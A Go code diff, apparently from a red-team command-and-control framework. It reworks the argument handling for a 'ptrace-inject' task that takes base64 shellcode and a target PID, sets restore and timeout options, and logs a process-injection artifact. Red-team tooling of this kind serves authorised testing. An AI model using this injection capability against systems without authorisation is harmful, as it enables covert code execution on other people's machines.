@@ -202,21 +202,52 @@ func init() {
 
 			case "cli":
 				// CLI/API mode — shellcode passed directly as base64
-				shellcodeB64, err := taskData.Args.GetStringArg("shellcode_b64")
-				logging.LogInfo("ptrace-inject CLI mode", "shellcode_b64_len", len(shellcodeB64), "err", fmt.Sprintf("%v", err))
-				if err != nil || shellcodeB64 == "" {
+				// Handle entirely within this case to avoid interference from other parameter groups
+				shellcodeB64, cliErr := taskData.Args.GetStringArg("shellcode_b64")
+				if cliErr != nil || shellcodeB64 == "" {
 					response.Success = false
 					response.Error = "shellcode_b64 parameter required"
 					return response
 				}
-				fileContents, err = base64.StdEncoding.DecodeString(shellcodeB64)
-				logging.LogInfo("ptrace-inject CLI decoded", "fileContents_len", len(fileContents), "err", fmt.Sprintf("%v", err))
-				if err != nil {
+				cliShellcode, cliErr := base64.StdEncoding.DecodeString(shellcodeB64)
+				if cliErr != nil {
 					response.Success = false
-					response.Error = "Failed to decode shellcode_b64: " + err.Error()
+					response.Error = "Failed to decode shellcode_b64: " + cliErr.Error()
 					return response
 				}
-				filename = "cli-shellcode"
+
+				cliPid, cliErr := taskData.Args.GetNumberArg("pid")
+				if cliErr != nil || cliPid <= 0 {
+					response.Success = false
+					response.Error = "Invalid PID specified (must be greater than 0)"
+					return response
+				}
+
+				cliRestore := true
+				if r, rErr := taskData.Args.GetBooleanArg("restore"); rErr == nil {
+					cliRestore = r
+				}
+				cliTimeout := 30
+				if t, tErr := taskData.Args.GetNumberArg("timeout"); tErr == nil && t > 0 {
+					cliTimeout = int(t)
+				}
+
+				displayParams := fmt.Sprintf("CLI inject: %d bytes → PID %d (restore=%v, timeout=%ds)",
+					len(cliShellcode), int(cliPid), cliRestore, cliTimeout)
+				response.DisplayParams = &displayParams
+				createArtifact(taskData.Task.ID, "Process Inject",
+					fmt.Sprintf("PTRACE_ATTACH/PTRACE_POKETEXT into PID %d (%d bytes)", int(cliPid), len(cliShellcode)))
+
+				cliParams := map[string]interface{}{
+					"action":        "inject",
+					"pid":           int(cliPid),
+					"shellcode_b64": base64.StdEncoding.EncodeToString(cliShellcode),
+					"restore":       cliRestore,
+					"timeout":       cliTimeout,
+				}
+				cliJSON, _ := json.Marshal(cliParams)
+				taskData.Args.SetManualArgs(string(cliJSON))
+				return response
 
 			case "check":
 				params := map[string]interface{}{
